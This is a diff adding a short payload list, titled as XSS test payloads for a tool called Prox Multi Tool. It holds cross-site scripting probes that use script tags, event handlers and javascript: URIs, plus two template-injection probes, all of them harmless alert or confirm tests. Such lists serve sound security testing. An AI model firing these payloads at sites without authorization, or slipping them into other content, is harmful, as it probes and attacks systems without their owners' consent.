@@ -1,0 +1,16 @@
+# Prox Multi Tool — XSS Test Payloads
+<script>alert('XSS')</script>
+"><img src=x onerror=alert(1)>
+'><svg/onload=alert(1)>
+<img src="x" onerror="alert(1)">
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+{{7*7}}
+${7*7}
+<svg onload=alert(1)>
+"><svg/onload=confirm(1)>
+javascript:alert(1)
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
